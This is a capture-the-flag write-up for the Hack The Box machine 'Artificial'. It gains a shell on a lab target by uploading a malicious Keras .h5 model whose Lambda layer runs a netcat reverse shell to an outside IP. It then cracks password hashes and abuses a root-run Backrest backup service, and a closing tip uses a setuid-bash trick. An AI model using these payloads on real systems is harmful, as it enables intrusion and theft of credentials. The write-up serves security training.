---
title: Artificial - HTB
date: 2025-06-26 01:00:00 +0200
categories: [Hack The Box, Linux0]
tags: [ Linux , File-Upload , Service-Abuse ]
toc: true
comments: true
image: ./assets/img/attachments/Artificial-1.png
imageNameKey: Artificial
---
Hey Everyone! Today I'm going to demonstrate how I pwned Artificial machine from hack the box, it's 7/1000 write-up. Lets goo!
## Port Enumeration
lets see what we have open for this ip:
```bash
sudo nmap -sS 10.10.11.74 -F -Pn -A
```
I started with -F to speed the process, then will run -p-
```bash
Nmap scan report for 10.10.11.74
Host is up (0.43s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   390.30 ms 10.10.16.1
2   199.20 ms 10.10.11.74
                                                                 
```
note: -p- didn't show anything new

I will check the website running on port 80 until full port enumeration is done.
After taking a close look on this web app, and creating an account, there was a requirements file at the upload section
![](/assets/img/attachments/Artificial.png)
```
Please ensure these requirements are installed when building your model, or use our Dockerfile to build the needed environment with ease.
```

So we need an .h5 file with this requirements, we have two options:
	1- either to use this tensorflow version
	2- or to use the docker file downloaded from this web page
	
![](/assets/img/attachments/Artificial-2.png)
building this docker
```bash
sudo docker build -t my-tf-container .
```
![](/assets/img/attachments/Artificial-3.png)

to be able to mount codes from the directory of my host:
```bash
sudo docker run -it -v $(pwd):/code my-tf-container
```

We will use this code to trigger a reverse shell. Why does this work?  
The web application allows users to upload `.h5` files without any validation. These files are based on the HDF5 format and can contain embedded Python objects. Keras uses `pickle` internally to deserialize custom objects when loading these model files. And by  including a malicious pickled object in the `.h5` file, it will lead to Remote Code Execution (RCE) during deserialization.
## Initial Access
I tried several codes with the help of ChatGPT but didn't trigger the reverse shell, but this one did 
[exploit code from github](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py)

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.66 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
![](/assets/img/attachments/Artificial-4.png)
Now after uploading this file and triggering it by `view predicitons` (Which the run_model endpoint)
RCE was triggered and we got the reverse shell!
![](/assets/img/attachments/Artificial-5.png)
## Lateral Movement
with more digging in those directories
![](/assets/img/attachments/Artificial-6.png)

I downloaded this file to my machine by 
```bash
python3 -m http.server (victim)
curl http://10.10.11.74:8000/users.db --output users.db (my machine)
```
Its sqlite file
![](/assets/img/attachments/Artificial-7.png)

Since there are multiple users, and to avoid wasting time, we can focus on the initial access we already have. In the `/home` directory, we find two user folders: `app` (which is our current user) and `geal`
lets try to crack geal pass
```bash
hashcat -m 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt
```
![](/assets/img/attachments/Artificial-8.png)
And got the password!
And i logged in as gael using ssh!
## Service Abuse
Then I ran linpeas, I didn't get any direct exploits, but active ports catches my eyes
![](/assets/img/attachments/Artificial-9.png)

port 5000 runs artificial.htb locally but what's on 9898?
using this command for port forwarding

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

![](/assets/img/attachments/Artificial-10.png)
There's this service running, but it has no direct public exploits. So the question here is: **what is this service?**

Running `backrest -h` reveals that it's a binary named `backrest` that exposes several command-line flags. This helped confirm that the service is **Backrest**, a web-based UI wrapper for the `restic` backup tool. It's intended to manage and automate backups in a self-hosted environment. It supports multiple repository backends — such as local storage, SFTP, S3, B2, and others supported by `restic` — and allows users to configure and schedule backups directly from the web interface.
since its a backup tool, i went back to linpeas output
![](/assets/img/attachments/Artificial-11.png)
There's backrest backup file!
I couldn't extract its content although i have read permission on it, because tar is recreating a folder to insert the uncompressed content in it and i don't have permissions to mkdir in this directory!
I transferred the file to my machine using http server, or u can copy it to geal user folder and uncompressed it there
In config.json:
![](/assets/img/attachments/Artificial-12.png)
we have bcrypt hash password which base 64 encoded

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```
To find hashcat mode
```bash
hashcat -h | grep bcrypt
```
and got the password using hashcat
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -a 0
```
logging in with this user
I created Restic repo
![](/assets/img/attachments/Artificial-13.png)

Then from running help command in Run Command option it was clear that i can backup any file (this service runs with root permission)
The easy way is to get the root flag and we can do the same to get root priv ssh key
![](/assets/img/attachments/Artificial-14.png)
![](/assets/img/attachments/Artificial-15.png)
We need the id 60... to be used with dump command
![](/assets/img/attachments/Artificial-16.png)
And to get ssh key
![](/assets/img/attachments/Artificial-17.png)
![](/assets/img/attachments/Artificial-18.png)
And ROOTED!!
## Extra Tip
I saw another neat root method where someone abused the `--restic-cmd` flag and used an environment variable like `RESTIC_PASSWORD_COMMAND='/bin/chmod +s /bin/bash'` to make bash setuid and get root — definitely a clever trick.
![](/assets/img/attachments/Artificial-19.png)
